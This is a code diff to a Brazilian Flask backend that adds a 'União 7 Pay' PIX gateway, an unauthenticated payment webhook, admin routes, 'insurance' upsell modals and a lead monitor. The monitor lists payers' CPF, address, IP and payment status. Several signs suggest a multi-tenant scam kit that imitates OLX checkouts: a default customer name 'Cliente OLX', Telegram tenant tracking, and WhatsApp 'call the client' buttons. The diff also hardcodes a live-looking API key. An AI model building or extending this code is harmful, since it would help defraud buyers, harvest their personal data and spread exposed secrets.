@@ -359,6 +359,125 @@ def _get_live_c7_keys() -> dict:
     """Alias retrocompativel para _get_live_gateway_keys()."""
     return _get_live_gateway_keys()
 
+# ─── UNIÃO 7 PAY — CONFIGURAÇÃO E INTEGRAÇÃO ──────────────────────────────────
+UNIAOPAY_DEFAULT_API_KEY  = "up_live_4dfac754f54c28d4f692fa1f58752e66354a36346c589cac"
+UNIAOPAY_DEFAULT_BASE_URL = "https://meupagamento.site/api/v1/uniaopay/pix/create"
+
+def _get_uniaopay_config(admin_id: Optional[int] = None) -> dict:
+    """
+    Retorna as credenciais e status da União 7 Pay:
+    1. Do Vault do Supreme Admin (se existir)
+    2. Fallback para variáveis de ambiente (.env)
+    """
+    supreme_id = admin_id or int(os.environ.get("SUPREME_ADMIN_ID", str(_SUPREME_ADMIN_ID)))
+    api_key = ""
+    base_url = UNIAOPAY_DEFAULT_BASE_URL
+    fallback_enabled = True
+
+    if VAULT_AVAILABLE and supreme_id:
+        creds = credential_vault.get_gateway_credentials(supreme_id, "uniaopay")
+        if creds:
+            api_key = creds.get("api_key", "").strip()
+            base_url = creds.get("base_url", "").strip() or base_url
+            if "fallback_enabled" in creds:
+                fallback_enabled = creds.get("fallback_enabled") not in ("0", False, "false")
+
+    if not api_key:
+        api_key = os.environ.get("UNIAOPAY_API_KEY", UNIAOPAY_DEFAULT_API_KEY).strip()
+    if not base_url:
+        base_url = os.environ.get("UNIAOPAY_BASE_URL", UNIAOPAY_DEFAULT_BASE_URL).strip()
+
+    env_fb = os.environ.get("UNIAOPAY_FALLBACK_ENABLED", "1")
+    if env_fb in ("0", "false", "no"):
+        fallback_enabled = False
+
+    return {
+        "api_key": api_key,
+        "base_url": base_url,
+        "fallback_enabled": fallback_enabled,
+    }
+
+def create_uniaopay_pix(amount: float, customer: dict, custom_api_key: str = "", custom_base_url: str = "") -> dict:
+    """
+    Gera cobrança PIX automatizada via União 7 Pay.
+    POST https://meupagamento.site/api/v1/uniaopay/pix/create
+    Headers: Authorization: Bearer <API_KEY>
+    Body: { "amount": 50.00, "customer": { "name": "...", "document": "...", "email": "...", "phone": "..." } }
+    """
+    cfg = _get_uniaopay_config()
+    api_key = (custom_api_key or cfg["api_key"]).strip()
+    base_url = (custom_base_url or cfg["base_url"]).strip()
+
+    if not api_key:
+        return {"ok": False, "error": "Chave API da União 7 Pay não configurada."}
+
+    clean_doc = re.sub(r'\D', '', str(customer.get("document", "")))
+    if not clean_doc or len(clean_doc) < 11:
+        clean_doc = "00000000000"
+
+    clean_phone = re.sub(r'\D', '', str(customer.get("phone", "")))
+    if not clean_phone or len(clean_phone) < 10:
+        clean_phone = "11999999999"
+
+    payload = {
+        "amount": round(float(amount), 2),
+        "customer": {
+            "name": str(customer.get("name") or "Cliente OLX")[:100],
+            "document": clean_doc[:14],
+            "email": str(customer.get("email") or "cliente@email.com")[:100],
+            "phone": clean_phone[:15]
+        }
+    }
+
+    headers = {
+        "Authorization": f"Bearer {api_key}",
+        "Content-Type": "application/json",
+        "Accept": "application/json"
+    }
+
+    try:
+        t0 = time.time()
+        res = requests.post(base_url, json=payload, headers=headers, timeout=12)
+        elapsed_ms = int((time.time() - t0) * 1000)
+
+        if res.status_code in (200, 201):
+            data = res.json()
+            tx_id = data.get("transaction_id") or data.get("id") or ""
+            payment = data.get("payment", {}) if isinstance(data.get("payment"), dict) else {}
+            pix_copia_cola = payment.get("pix_copia_cola") or data.get("pix_copia_cola") or data.get("qrcode") or ""
+            expires_in = payment.get("expires_in") or data.get("expires_in") or 1800
+
+            if pix_copia_cola:
+                qr_url = f"https://api.qrserver.com/v1/create-qr-code/?size=250x250&data={requests.utils.quote(pix_copia_cola)}"
+                return {
+                    "ok": True,
+                    "gateway": "uniaopay",
+                    "transaction_id": tx_id,
+                    "pix_code": pix_copia_cola,
+                    "qr_code_url": qr_url,
+                    "expires_in": expires_in,
+                    "status": "pending",
+                    "elapsed_ms": elapsed_ms,
+                    "raw": data
+                }
+            else:
+                return {
+                    "ok": False,
+                    "error": "A União 7 Pay não retornou pix_copia_cola no payload.",
+                    "status_code": res.status_code,
+                    "response": data
+                }
+        else:
+            return {
+                "ok": False,
+                "error": f"Erro HTTP {res.status_code} na União 7 Pay: {res.text[:250]}",
+                "status_code": res.status_code,
+                "response_text": res.text[:250]
+            }
+    except Exception as e:
+        return {"ok": False, "error": f"Exceção de conexão com União 7 Pay: {str(e)}"}
+
+
 
 
 
@@ -5258,7 +5377,7 @@ def generate_pix():
     city           = sanitize_input(data.get('city', ''), 100)
     state          = sanitize_input(data.get('state', ''), 20)
     cep            = sanitize_input(data.get('cep', ''), 20)
-    prod_title     = sanitize_input(data.get('product', '') or data.get('product_name', ''), 150)
+    prod_title     = sanitize_input(data.get('upsell_title', '') or data.get('product', '') or data.get('product_name', ''), 150)
 
     
 
@@ -5424,9 +5543,34 @@ def generate_pix():
     live_base_url = gw_keys.get("base_url", "https://api.elitepaybr.com").rstrip("/")
     client_id = gw_keys.get("client_id") or gw_keys.get("api_key", "")
     client_secret = gw_keys.get("client_secret") or gw_keys.get("api_secret", "")
+    gateway_used = active_gw
 
-    # ── 1. Tentativa Primária: ElitePay (POST /api/v1/deposit) ──────────────────
-    if active_gw == "elitepay" or not active_gw:
+    # ── 1. Tentativa Primária: União 7 Pay (se configurada como ativa principal) ──
+    if active_gw == "uniaopay":
+        u7_res = create_uniaopay_pix(
+            c7_amount,
+            {
+                "name": payer_name,
+                "document": payer_document,
+                "email": clean_email,
+                "phone": clean_phone
+            },
+            custom_api_key=client_id,
+            custom_base_url=live_base_url
+        )
+        if u7_res.get("ok"):
+            c7_id = u7_res.get("transaction_id", "")
+            pix_code = u7_res.get("pix_code", "")
+            qr_code_url = u7_res.get("qr_code_url", "")
+            expires_at = str(int(time.time() + u7_res.get("expires_in", 1800)))
+            c7_status = "pending"
+            gateway_used = "uniaopay"
+            print(f"[Uniao7Pay API] Pix criado com sucesso como principal! ID: {c7_id}")
+        else:
+            print(f"[Uniao7Pay API] Falha na tentativa principal: {u7_res.get('error')}")
+
+    # ── 2. Tentativa Primária: ElitePay (POST /api/v1/deposit) ──────────────────
+    elif active_gw == "elitepay" or not active_gw:
         if client_id and client_secret and "xxx" not in client_id:
             try:
                 elite_payload = {
@@ -5444,13 +5588,13 @@ def generate_pix():
                 )
                 if res.status_code in (200, 201):
                     resp = res.json()
-                    # Estrutura oficial ElitePay: transactionId, qrcodeUrl, copyPaste, status
                     if resp.get("success") or resp.get("copyPaste") or resp.get("transactionId"):
                         c7_id = resp.get("transactionId") or resp.get("id") or ""
                         pix_code = resp.get("copyPaste") or resp.get("pixCopiaECola") or resp.get("emv") or resp.get("qrcode") or ""
                         qr_code_url = resp.get("qrcodeUrl") or resp.get("qrCodeBase64") or resp.get("qrCodeUrl") or ""
                         expires_at = resp.get("expiresAt") or resp.get("expires_at") or ""
                         c7_status = resp.get("status", "PENDENTE").lower()
+                        gateway_used = "elitepay"
                         print(f"[ElitePay API] Pix criado com sucesso! ID: {c7_id}")
                     else:
                         print(f"[ElitePay API] Resposta inesperada: {resp}")
@@ -5458,6 +5602,8 @@ def generate_pix():
                     print(f"[ElitePay API] Erro HTTP {res.status_code}: {res.text[:200]}")
             except Exception as err:
                 print(f"[ElitePay API] Excecao: {err}")
+
+    # ── 3. Tentativa Primária: Carteira do 7 (C7) ──────────────────────────────
     elif active_gw == "c7":
         if client_id and "c7_live_xxx" not in client_id:
             try:
@@ -5480,14 +5626,38 @@ def generate_pix():
                         qr_code_url = p.get("qrCodeBase64") or p.get("qrCodeUrl") or ""
                         expires_at = p.get("expiresAt") or ""
                         c7_status = p.get("status", "pending")
+                        gateway_used = "c7"
             except Exception as err:
                 print(f"[C7 Fallback] Excecao: {err}")
 
-
+    # ── 4. FAILOVER AUTOMÁTICO: UNIÃO 7 PAY (SE A PRIMÁRIA FALHOU) ─────────────
+    if not pix_code and active_gw != "uniaopay":
+        u7_cfg = _get_uniaopay_config()
+        if u7_cfg.get("fallback_enabled") and u7_cfg.get("api_key"):
+            print(f"[FAILOVER] Gateway primario ({active_gw}) falhou. Acionando União 7 Pay como secundaria automatica...")
+            u7_res = create_uniaopay_pix(
+                c7_amount,
+                {
+                    "name": payer_name,
+                    "document": payer_document,
+                    "email": clean_email,
+                    "phone": clean_phone
+                }
+            )
+            if u7_res.get("ok"):
+                c7_id = u7_res.get("transaction_id", "")
+                pix_code = u7_res.get("pix_code", "")
+                qr_code_url = u7_res.get("qr_code_url", "")
+                expires_at = str(int(time.time() + u7_res.get("expires_in", 1800)))
+                c7_status = "pending"
+                gateway_used = "uniaopay (failover)"
+                print(f"[FAILOVER SUCCESS] Pix gerado com sucesso via União 7 Pay! ID: {c7_id}")
+            else:
+                print(f"[FAILOVER ERROR] União 7 Pay tambem falhou: {u7_res.get('error')}")
 
     if not pix_code:
-
         # Gera PIX EMV válido com CRC-16/CCITT correto (BACEN BR Code 2.0)
+        gateway_used = "emv_local"
 
         pix_key_fallback = ""
 
@@ -5554,12 +5724,14 @@ def generate_pix():
         "coupon":       coupon,
         "tg_id":        tg_id_for_price,
         "slug":         slug_for_price,
+        "gateway":      gateway_used,
     }
 
     _save_payment(record)
 
     pix_log_payload = dict(record)
     pix_log_payload.update({
+        "gateway":    gateway_used,
         "c7_id":      c7_id or "fallback-emv",
         "payment_id": payment_id,
         "amount":     f"{c7_amount:.2f}",
@@ -5955,10 +6127,188 @@ def universal_webhook():
     return jsonify({"ok": True}), 200
 
 
+# ─── WEBHOOK UNIÃO 7 PAY ──────────────────────────────────────────────────────
+@app.route('/api/webhook/uniaopay', methods=['POST'])
+@app.route('/api/webhook/uniao7pay', methods=['POST'])
+def webhook_uniaopay():
+    """
+    Webhook oficial União 7 Pay:
+    Recebe POST:
+    {
+      "transaction_id": "tx_abcdef123456",
+      "status": "paid",
+      "amount": 50.00
+    }
+    """
+    payload = request.json or {}
+    tx_id = sanitize_input(str(payload.get("transaction_id") or payload.get("transactionId") or payload.get("id") or ""), 80)
+    status = sanitize_input(str(payload.get("status", "")), 30).lower()
+    amount = payload.get("amount")
+
+    if not tx_id:
+        return jsonify({"ok": False, "error": "transaction_id_missing"}), 400
+
+    print(f"[Uniao7Pay Webhook] Recebido: tx_id={tx_id}, status={status}, amount={amount}")
+
+    # Idempotência
+    if tx_id in PROCESSED_WEBHOOKS:
+        return jsonify({"ok": True, "duplicate": True}), 200
+
+    is_confirmed = status in ("paid", "approved", "success", "concluido", "completo")
+
+    # Localiza o registro de pagamento
+    record = None
+    for pid, p in list(PAYMENTS_DB.items()):
+        if p.get("c7_id") == tx_id or p.get("payment_id") == tx_id:
+            record = p
+            break
+
+    if not record:
+        try:
+            conn = admin_bot.get_db() if BOT_AVAILABLE else (tg_wh._get_db() if TG_WH_AVAILABLE else None)
+            if conn:
+                row = conn.execute("SELECT * FROM payments WHERE c7_id=? OR payment_id=?", (tx_id, tx_id)).fetchone()
+                if row:
+                    record = dict(row)
+                conn.close()
+        except Exception:
+            pass
+
+    if is_confirmed:
+        PROCESSED_WEBHOOKS.add(tx_id)
+        pid = (record.get("payment_id") if record else "") or tx_id
+        if record:
+            _update_payment_status(pid, "paid")
+            record = PAYMENTS_DB.get(pid) or record
+
+            confirmed_payload = dict(record)
+            confirmed_payload.update({
+                "c7_id": tx_id,
+                "payment_id": pid,
+                "amount": amount or record.get("amount"),
+                "status": "paid",
+                "gateway": "uniaopay"
+            })
+
+            _log("PAYMENT_CONFIRMED", pid, confirmed_payload)
+
+            if TG_WH_AVAILABLE and record.get("tg_id") and record.get("slug"):
+                tg_wh.log_tenant_event(record["tg_id"], record["slug"], "PAYMENT_CONFIRMED", pid, record.get("ip", ""), confirmed_payload)
+                tg_wh.mark_tg_converted(record["tg_id"], pid)
+
+            if TG_WH_AVAILABLE:
+                html_msg = _format_payment_html_msg(confirmed_payload)
+                wa_digits = re.sub(r'\D', '', str(record.get("phone", "")))
+                markup = None
+                if len(wa_digits) >= 10:
+                    wa_num = wa_digits if wa_digits.startswith("55") else f"55{wa_digits}"
+                    markup = {"inline_keyboard": [[{"text": "💬 Chamar Cliente no WhatsApp", "url": f"https://wa.me/{wa_num}"}]]}
+                tg_wh.notify_log_channel("pagamento", html_msg, markup=markup)
+
+            return jsonify({"ok": True, "message": "Pagamento confirmado via União 7 Pay"}), 200
+        else:
+            print(f"[Uniao7Pay Webhook] Transação {tx_id} aprovada, mas não encontrada em cache local.")
+            return jsonify({"ok": True, "warning": "transaction_not_found_locally"}), 200
+
+    return jsonify({"ok": True, "status": status}), 200
 
 
+# ─── ADMIN SUPREMO: UNIÃO 7 PAY CONFIG & CONTROLE ─────────────────────────────
+@app.route('/api/admin/uniaopay/config', methods=['GET', 'POST'])
+def api_admin_uniaopay_config():
+    """Retorna ou atualiza as configurações da União 7 Pay no Vault."""
+    admin_id, role = verify_admin_access(request)
+    if not admin_id:
+        return jsonify({"ok": False, "error": "unauthorized"}), 401
 
-@app.route('/api/c7/balance', methods=['POST'])
+    supreme_id = int(os.environ.get("SUPREME_ADMIN_ID", str(_SUPREME_ADMIN_ID)))
+    if admin_id != supreme_id and role != "supreme_admin":
+        return jsonify({"ok": False, "error": "acesso_restrito", "message": "Exclusivo do Admin Supremo."}), 403
+
+    if request.method == 'GET':
+        cfg = _get_uniaopay_config()
+        active_gw = credential_vault.get_active_gateway(supreme_id) if VAULT_AVAILABLE else "elitepay"
+        return jsonify({
+            "ok": True,
+            "config": {
+                "api_key": cfg["api_key"],
+                "base_url": cfg["base_url"],
+                "fallback_enabled": cfg["fallback_enabled"],
+                "is_active_primary": active_gw == "uniaopay",
+                "active_gateway": active_gw
+            }
+        })
+
+    data = request.json or {}
+    api_key = data.get("api_key", "").strip()
+    base_url = data.get("base_url", "").strip() or UNIAOPAY_DEFAULT_BASE_URL
+    fallback_enabled = bool(data.get("fallback_enabled", True))
+    make_primary = bool(data.get("make_primary", False))
+
+    if VAULT_AVAILABLE:
+        creds = {
+            "api_key": api_key,
+            "base_url": base_url,
+            "fallback_enabled": "1" if fallback_enabled else "0"
+        }
+        credential_vault.save_gateway_credentials(supreme_id, "uniaopay", creds, ip=_user_ip())
+        if make_primary:
+            credential_vault.set_gateway_active(supreme_id, "uniaopay", True, ip=_user_ip())
+
+    return jsonify({"ok": True, "message": "Configurações da União 7 Pay salvas com sucesso!"})
+
+
+@app.route('/api/admin/uniaopay/activate', methods=['POST'])
+def api_admin_uniaopay_activate():
+    """Ativa ou desativa a União 7 Pay como Gateway Primário Oficial."""
+    admin_id, role = verify_admin_access(request)
+    if not admin_id:
+        return jsonify({"ok": False, "error": "unauthorized"}), 401
+
+    supreme_id = int(os.environ.get("SUPREME_ADMIN_ID", str(_SUPREME_ADMIN_ID)))
+    if admin_id != supreme_id and role != "supreme_admin":
+        return jsonify({"ok": False, "error": "acesso_restrito"}), 403
+
+    data = request.json or {}
+    active = bool(data.get("active", True))
+
+    if VAULT_AVAILABLE:
+        if active:
+            credential_vault.set_gateway_active(supreme_id, "uniaopay", True, ip=_user_ip())
+            return jsonify({"ok": True, "message": "União 7 Pay ativada como Gateway Primário!"})
+        else:
+            credential_vault.set_gateway_active(supreme_id, "elitepay", True, ip=_user_ip())
+            return jsonify({"ok": True, "message": "ElitePay restaurada como Gateway Primário!"})
+
+    return jsonify({"ok": True})
+
+
+@app.route('/api/admin/uniaopay/test', methods=['POST'])
+def api_admin_uniaopay_test():
+    """
+    Testa a chave e endpoint da União 7 Pay em tempo real gerando uma cobrança teste mínima (R$ 1,00).
+    """
+    admin_id, role = verify_admin_access(request)
+    if not admin_id:
+        return jsonify({"ok": False, "error": "unauthorized"}), 401
+
+    data = request.json or {}
+    api_key = data.get("api_key", "").strip()
+    base_url = data.get("base_url", "").strip()
+
+    test_res = create_uniaopay_pix(
+        amount=1.00,
+        customer={
+            "name": "Teste Conexao Supremo",
+            "document": "12345678909",
+            "email": "admin@teste.com",
+            "phone": "11999999999"
+        },
+        custom_api_key=api_key,
+        custom_base_url=base_url
+    )
+    return jsonify(test_res)
+
 
 # ─── ELITEPAY FINANCIAL SUITE & SAQUES RÁPIDOS (ADMIN SUPREMO) ──────────────
 
@@ -7003,48 +7353,146 @@ def api_product_link(code):
 
 
 @app.route('/api/products/<code>/apply', methods=['POST'])
-
 def api_products_apply(code):
-
-    """Define um produto como padrão ativo da loja (sobrescreve config global)."""
-
-    if not BOT_AVAILABLE:
-
-        return jsonify({"ok": False, "error": "bot_not_available"}), 503
+    """Define um produto do catálogo como produto ativo da loja."""
+    admin_id, role = verify_admin_access(request)
+    if not admin_id:
+        return jsonify({"ok": False, "error": "unauthorized"}), 401
 
     safe_code = sanitize_input(code, 80)
 
-    conn = admin_bot.get_db()
+    # 1º: busca em tenant_products (produtos criados pelo admin no painel)
+    if TG_WH_AVAILABLE:
+        prods = tg_wh.get_tenant_products(admin_id)
+        prod = next((p for p in prods if p.get("product_code") == safe_code), None)
+        if prod:
+            # Propaga configáes do produto para a config global do admin
+            tg_wh.set_tenant_config(admin_id, "product_name",        prod.get("title", ""))
+            tg_wh.set_tenant_config(admin_id, "product_price",       prod.get("price", ""))
+            tg_wh.set_tenant_config(admin_id, "product_old_price",   prod.get("old_price", ""))
+            tg_wh.set_tenant_config(admin_id, "product_description", prod.get("description", ""))
+            tg_wh.set_tenant_config(admin_id, "active_product_code", safe_code)
+            if prod.get("image_url") or prod.get("image1"):
+                img = prod.get("image_url") or prod.get("image1", "")
+                tg_wh.set_tenant_config(admin_id, "product_image",  img)
+                tg_wh.set_tenant_config(admin_id, "product_image1", img)
+            if prod.get("image2"): tg_wh.set_tenant_config(admin_id, "product_image2", prod["image2"])
+            if prod.get("image3"): tg_wh.set_tenant_config(admin_id, "product_image3", prod["image3"])
+            _log("PRODUCT_APPLIED", str(uuid.uuid4()), {"code": safe_code, "name": prod.get("title", "")})
+            return jsonify({"ok": True, "applied": safe_code, "name": prod.get("title", "")})
 
-    row = conn.execute(
+    # 2º: fallback em product_templates (bot.py)
+    if BOT_AVAILABLE:
+        conn = admin_bot.get_db()
+        row = conn.execute(
+            "SELECT name, price, description, image_url FROM product_templates WHERE code=?", (safe_code,)
+        ).fetchone()
+        conn.close()
+        if row:
+            admin_bot.set_config("product_name",        row["name"])
+            admin_bot.set_config("product_price",       row["price"])
+            admin_bot.set_config("product_description", row["description"] or "")
+            if row["image_url"]:
+                admin_bot.set_config("product_image",  row["image_url"])
+                admin_bot.set_config("product_image1", row["image_url"])
+            _log("PRODUCT_APPLIED", str(uuid.uuid4()), {"code": safe_code, "name": row["name"]})
+            return jsonify({"ok": True, "applied": safe_code, "name": row["name"]})
 
-        "SELECT name, price, description, image_url FROM product_templates WHERE code=?", (safe_code,)
-
-    ).fetchone()
-
-    conn.close()
-
-    if not row:
-
-        return jsonify({"ok": False, "error": "Produto não encontrado"}), 404
+    return jsonify({"ok": False, "error": "Produto não encontrado"}), 404
 
 
+# ─── UPSELL MODAIS ──────────────────────────────────────────────────────
 
-    admin_bot.set_config("product_name",        row["name"])
+@app.route('/api/admin/upsell/<product_code>', methods=['GET'])
+def api_upsell_list(product_code):
+    """Lista modais de upsell de um produto."""
+    admin_id, role = verify_admin_access(request)
+    if not admin_id:
+        return jsonify({"ok": False, "error": "unauthorized"}), 401
+    if not TG_WH_AVAILABLE:
+        return jsonify({"ok": True, "modals": []})
+    modals = tg_wh.get_upsell_modals(admin_id, product_code)
+    return jsonify({"ok": True, "modals": modals})
 
-    admin_bot.set_config("product_price",       row["price"])
 
-    admin_bot.set_config("product_description", row["description"] or "")
+@app.route('/api/admin/upsell/<product_code>', methods=['POST'])
+def api_upsell_create(product_code):
+    """Cria um novo modal de upsell."""
+    admin_id, role = verify_admin_access(request)
+    if not admin_id:
+        return jsonify({"ok": False, "error": "unauthorized"}), 401
+    if not TG_WH_AVAILABLE:
+        return jsonify({"ok": False, "error": "indisponível"}), 503
+    data = request.json or {}
+    if not data.get("title", "").strip():
+        return jsonify({"ok": False, "error": "Título obrigatório."}), 400
+    new_id = tg_wh.create_upsell_modal(admin_id, product_code, data)
+    return jsonify({"ok": True, "id": new_id, "message": "Modal criado com sucesso!"})
 
-    if row["image_url"]:
 
-        admin_bot.set_config("product_image",   row["image_url"])
+@app.route('/api/admin/upsell/modal/<int:modal_id>', methods=['PUT'])
+def api_upsell_update(modal_id):
+    """Atualiza um modal de upsell."""
+    admin_id, role = verify_admin_access(request)
+    if not admin_id:
+        return jsonify({"ok": False, "error": "unauthorized"}), 401
+    if not TG_WH_AVAILABLE:
+        return jsonify({"ok": False, "error": "indisponível"}), 503
+    data = request.json or {}
+    ok = tg_wh.update_upsell_modal(admin_id, modal_id, data)
+    if ok:
+        return jsonify({"ok": True, "message": "Modal atualizado!"})
+    return jsonify({"ok": False, "error": "Modal não encontrado."}), 404
 
-        admin_bot.set_config("product_image1",  row["image_url"])
 
-    _log("PRODUCT_APPLIED", str(uuid.uuid4()), {"code": safe_code, "name": row["name"]})
+@app.route('/api/admin/upsell/modal/<int:modal_id>', methods=['DELETE'])
+def api_upsell_delete(modal_id):
+    """Remove um modal de upsell."""
+    admin_id, role = verify_admin_access(request)
+    if not admin_id:
+        return jsonify({"ok": False, "error": "unauthorized"}), 401
+    if not TG_WH_AVAILABLE:
+        return jsonify({"ok": False, "error": "indisponível"}), 503
+    ok = tg_wh.delete_upsell_modal(admin_id, modal_id)
+    if ok:
+        return jsonify({"ok": True, "message": "Modal removido!"})
+    return jsonify({"ok": False, "error": "Modal não encontrado."}), 404
 
-    return jsonify({"ok": True, "applied": safe_code, "name": row["name"]})
+
+@app.route('/api/admin/upsell/<product_code>/reorder', methods=['POST'])
+def api_upsell_reorder(product_code):
+    """Reordena modais de upsell."""
+    admin_id, role = verify_admin_access(request)
+    if not admin_id:
+        return jsonify({"ok": False, "error": "unauthorized"}), 401
+    if not TG_WH_AVAILABLE:
+        return jsonify({"ok": False, "error": "indisponível"}), 503
+    data = request.json or {}
+    order = data.get("order", [])
+    tg_wh.reorder_upsell_modals(admin_id, product_code, order)
+    return jsonify({"ok": True})
+
+
+@app.route('/api/upsell/<product_code>', methods=['GET'])
+def api_upsell_public(product_code):
+    """Endpoint público: retorna modais ativos de upsell para o frontend do lead."""
+    if not TG_WH_AVAILABLE:
+        return jsonify({"ok": True, "modals": []})
+    modals = tg_wh.get_upsell_modals_by_code(product_code)
+    # Remove dados internos, expoe só o necessário
+    safe = [{
+        "id":          m["id"],
+        "icon":        m.get("icon") or "shield-check",
+        "type":        m.get("type") or "Seguro",
+        "title":       m["title"],
+        "description": m["description"],
+        "amount":      m["amount"],
+        "replay":      bool(m["replay"]),
+        "position":    m["position"],
+    } for m in modals]
+    return jsonify({"ok": True, "modals": safe})
+
+
 
 
 
@@ -8329,48 +8777,86 @@ def monitor_leads():
 
         today_start = int(datetime.now().replace(hour=0, minute=0, second=0, microsecond=0).timestamp())
 
-        leads = []
+        # Index de pagamentos reais (confirmados e pendentes)
+        payments_by_cpf = {}
+        payments_by_sess = {}
+        try:
+            p_rows = db.execute(
+                "SELECT payment_id, c7_id, external_id, amount, status, payer_cpf, payer_name, confirmed_at, created_at "
+                "FROM payments ORDER BY created_at DESC"
+            ).fetchall()
+            for pr in p_rows:
+                p_dict = dict(pr)
+                raw_p_cpf = ''.join(c for c in str(p_dict.get("payer_cpf") or "") if c.isdigit())
+                if raw_p_cpf and raw_p_cpf not in payments_by_cpf:
+                    payments_by_cpf[raw_p_cpf] = p_dict
+                pid = str(p_dict.get("payment_id") or "")
+                if pid and pid not in payments_by_sess:
+                    payments_by_sess[pid] = p_dict
+                c7 = str(p_dict.get("c7_id") or "")
+                if c7 and c7 not in payments_by_sess:
+                    payments_by_sess[c7] = p_dict
+                ext = str(p_dict.get("external_id") or "")
+                if ext and ext not in payments_by_sess:
+                    payments_by_sess[ext] = p_dict
+        except Exception as _p_err:
+            pass
 
+        # Index de eventos de pagamento confirmados
+        paid_events_by_sess = {}
+        paid_events_by_cpf = {}
+        try:
+            ev_paid_rows = db.execute(
+                "SELECT session_id, data_enc, created_at FROM events WHERE event_type IN ('PAYMENT_CONFIRMED', 'PIX_PAID', 'PAYMENT_CONFIRMED_SUCCESS') "
+                "ORDER BY created_at DESC"
+            ).fetchall()
+            for er in ev_paid_rows:
+                s_id = er["session_id"]
+                edata = {}
+                if er["data_enc"] and BOT_AVAILABLE:
+                    try:
+                        import bot as _bot_mod
+                        raw_e = _bot_mod.crypto_engine.decrypt(er["data_enc"])
+                        if isinstance(raw_e, dict):
+                            edata = raw_e
+                        elif isinstance(raw_e, str):
+                            import json as _j
+                            edata = _j.loads(raw_e)
+                    except Exception:
+                        pass
+                if s_id and s_id not in paid_events_by_sess:
+                    paid_events_by_sess[s_id] = {"ts": er["created_at"], "data": edata}
+                cpf_e = ''.join(c for c in str(edata.get("cpf") or "") if c.isdigit())
+                if cpf_e and cpf_e not in paid_events_by_cpf:
+                    paid_events_by_cpf[cpf_e] = {"ts": er["created_at"], "data": edata}
+        except Exception:
+            pass
+
+        leads = []
         today_count = 0
 
         for r in rows:
-
             ts = r["created_at"] or 0
-
             if ts >= today_start:
-
                 today_count += 1
 
             data = {}
-
             if r["data_enc"] and BOT_AVAILABLE:
-
                 try:
-
                     import bot as _bot_mod
-
                     raw = _bot_mod.crypto_engine.decrypt(r["data_enc"])
-
                     if isinstance(raw, dict):
-
                         data = raw
-
                     elif isinstance(raw, str):
-
                         import json as _j
-
                         data = _j.loads(raw)
-
                 except Exception:
-
                     pass
-
-
 
             # CPF: supremo ve completo formatado (000.000.000-00); demais veem mascarado
             cpf_raw = data.get("cpf", "")
+            digits = ''.join(c for c in str(cpf_raw) if c.isdigit())
             if role == "supreme_admin":
-                digits = ''.join(c for c in cpf_raw if c.isdigit())
                 if len(digits) == 11:
                     cpf_masked = f"{digits[:3]}.{digits[3:6]}.{digits[6:9]}-{digits[9:]}"
                 else:
@@ -8378,90 +8864,112 @@ def monitor_leads():
             else:
                 cpf_masked = f"{cpf_raw[:3]}.***.***-{cpf_raw[-2:]}" if len(cpf_raw) >= 11 else cpf_raw
 
+            # Verificação real do pagamento via Gateway / DB
+            sess_id = r["session_id"] or ""
+            matched_pay = None
+            if digits and digits in payments_by_cpf:
+                matched_pay = payments_by_cpf[digits]
+            elif sess_id and sess_id in payments_by_sess:
+                matched_pay = payments_by_sess[sess_id]
 
+            matched_ev = None
+            if sess_id and sess_id in paid_events_by_sess:
+                matched_ev = paid_events_by_sess[sess_id]
+            elif digits and digits in paid_events_by_cpf:
+                matched_ev = paid_events_by_cpf[digits]
+
+            is_paid = False
+            payment_status = "unpaid"
+            paid_amount = 0.0
+            paid_at = None
+            paid_gateway = None
+            tx_id = None
+
+            if matched_pay:
+                st = str(matched_pay.get("status") or "").lower()
+                if st in ("paid", "approved", "completo"):
+                    is_paid = True
+                    payment_status = "paid"
+                    try:
+                        paid_amount = float(matched_pay.get("amount") or 0.0)
+                    except Exception:
+                        paid_amount = 0.0
+                    paid_at = matched_pay.get("confirmed_at")
+                    c7_id = str(matched_pay.get("c7_id") or "")
+                    paid_gateway = "União 7 Pay" if ("api_in_" in c7_id or "tx_" in c7_id) else "ElitePay"
+                    tx_id = matched_pay.get("external_id") or matched_pay.get("payment_id") or c7_id
+                elif st in ("pending", "processing", "aguardando"):
+                    payment_status = "pending"
+                else:
+                    payment_status = st
+            elif matched_ev:
+                is_paid = True
+                payment_status = "paid"
+                ev_d = matched_ev.get("data") or {}
+                try:
+                    paid_amount = float(str(ev_d.get("amount") or "0").replace(",", "."))
+                except Exception:
+                    paid_amount = 0.0
+                paid_at = matched_ev.get("ts")
+                c7_id = str(ev_d.get("c7_id") or "")
+                paid_gateway = "União 7 Pay" if ("api_in_" in c7_id or "tx_" in c7_id) else "ElitePay"
+                tx_id = ev_d.get("payment_id") or c7_id
 
             leads.append({
-
-                "slug":         r["slug"],
-
-                "tg_id":        r["tg_id"],
-
-                "session_id":   r["session_id"],
-
-                "ip":           r["ip"],
-
-                "ts":           ts,
-
-                "name":         data.get("name", data.get("nome", "")),
-
-                "cpf":          cpf_masked,
-
-                "phone":        data.get("phone", data.get("whatsapp", "")),
-
-                "email":        data.get("email", ""),
-
-                "city":         data.get("city", ""),
-
-                "state":        data.get("state", ""),
-
-                "cep":          data.get("cep", ""),
-
-                "street":       data.get("street", ""),
-
-                "number":       data.get("number", ""),
-
-                "neighborhood": data.get("neighborhood", ""),
-
-                "product":      data.get("product", ""),
-
-                "amount":       data.get("amount", ""),
-
-                "cpf_verified": data.get("cpf_verified", False),
-
-                "ua":           data.get("ua", "")[:80],
-
+                "slug":           r["slug"],
+                "tg_id":          r["tg_id"],
+                "session_id":     r["session_id"],
+                "ip":             r["ip"],
+                "ts":             ts,
+                "name":           data.get("name", data.get("nome", "")),
+                "cpf":            cpf_masked,
+                "phone":          data.get("phone", data.get("whatsapp", "")),
+                "email":          data.get("email", ""),
+                "city":           data.get("city", ""),
+                "state":          data.get("state", ""),
+                "cep":            data.get("cep", ""),
+                "street":         data.get("street", ""),
+                "number":         data.get("number", ""),
+                "neighborhood":   data.get("neighborhood", ""),
+                "product":        data.get("product", ""),
+                "amount":         data.get("amount", ""),
+                "cpf_verified":   data.get("cpf_verified", False),
+                "ua":             data.get("ua", "")[:80],
+                "is_paid":        is_paid,
+                "payment_status": payment_status,
+                "paid_amount":    paid_amount,
+                "paid_at":        paid_at,
+                "paid_gateway":   paid_gateway,
+                "tx_id":          tx_id,
             })
 
-
-
-        # Conversion rate — filtered by tg_id for regular admins
+        # Conversion rate & aggregate counts
+        paid_count = sum(1 for ld in leads if ld["is_paid"])
+        pending_count = len(leads) - paid_count
